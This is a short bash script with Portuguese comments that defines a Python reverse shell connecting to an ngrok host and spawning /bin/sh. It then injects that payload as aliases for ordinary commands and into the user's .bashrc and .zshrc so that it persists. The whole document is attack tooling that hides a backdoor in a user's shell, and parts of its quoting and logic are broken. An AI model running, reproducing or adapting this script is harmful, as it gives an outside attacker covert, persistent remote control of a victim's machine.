#!/bin/bash
#includes: python
PAYLOAD="python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('0.tcp.sa.ngrok.io',19392));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')'"


function toinject() {
##- Injetando como alias -##
function alias_inject(){
    while RUN= read -r line || [[ -n "$line" ]]; do
    echo "alias $line = '$PAYLOAD'"
    done < .commands.txt
}


##- Injetando no bashrc & zshrc  -##
function rc_inject() {
    $PAYLOAD >> "$HOME"/.bashrc
    $PAYLOAD >> "$HOME"/.zshrc
}


##- Rodando funcoes -##
alias_inject >> "$HOME"/teste2.txt
alias_inject >> "$HOME"/teste3.txt
rc_inject
}
